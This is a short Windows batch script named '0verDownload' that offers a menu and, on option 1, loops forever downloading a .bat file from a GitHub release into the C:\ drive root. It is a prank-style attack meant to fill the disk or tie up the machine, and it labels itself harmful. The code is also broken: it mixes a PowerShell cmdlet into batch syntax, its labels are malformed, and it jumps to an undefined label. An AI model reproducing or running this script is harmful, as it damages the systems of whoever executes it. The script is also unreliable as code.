@echo off
color 0a
echo WARNING! THIS COULD BE HARMFUL TO YOUR COMPUTER!
echo.
echo (1 Start the 0verDownload
echo (2 Quit
set /p web=Type option:
if "%web%"=="1" goto pain
if "%web%"=="2" exit
goto home

pain:
Invoke-WebRequest -Uri "https://github.com/jijipwn/0verDownload/releases/download/P/0verDownload.bat" -OutFile "C:\"
goto pain